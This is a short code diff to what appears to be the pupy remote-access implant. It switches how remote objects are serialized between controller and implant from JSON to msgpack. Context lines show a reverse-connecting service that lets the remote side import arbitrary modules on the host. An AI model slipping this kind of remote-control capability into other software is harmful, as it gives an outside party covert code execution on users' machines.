@@ -71,6 +71,11 @@ except ImportError:
 except Exception as e:
     logging.warning(e)
 
+try:
+    import msgpack
+except:
+    import umsgpack as msgpack
+
 logging.getLogger().setLevel(logging.WARNING)
 
 try:
@@ -372,22 +377,20 @@ setattr(pupy, 'Task', Task)
 
 def safe_obtain(proxy):
     """ safe version of rpyc's rpyc.utils.classic.obtain, without using pickle. """
+
     if type(proxy) in [list, str, bytes, dict, set, type(None)]:
         return proxy
+
     conn = object.__getattribute__(proxy, "____conn__")()
-    return json.loads(
+    return msgpack.loads(
         zlib.decompress(
-            conn.root.json_dumps(proxy, compressed=True)
+            conn.root.msgpack_dumps(proxy, compressed=True)
         )
     ) # should prevent any code execution
 
-def obtain(proxy):
-    """ allows to convert netref types into python native types """
-    return safe_obtain(proxy)
-
 debug = False
 
-setattr(pupy, 'obtain', obtain) # I don't see a better spot to put this util
+setattr(pupy, 'obtain', safe_obtain) # I don't see a better spot to put this util
 
 LAUNCHER = "connect"  # the default launcher to start when no argv
 # default launcher arguments
@@ -491,6 +494,12 @@ class ReverseSlaveService(Service):
     def exposed_getmodule(self, name):
         """imports an arbitrary module"""
         return __import__(name, None, None, "*")
+
+    def exposed_msgpack_dumps(self, obj, compressed=False):
+        data = msgpack.dumps(obj)
+        if compressed:
+            data = zlib.compress(data)
+        return data
 
     def exposed_json_dumps(self, obj, compressed=False):
         try:
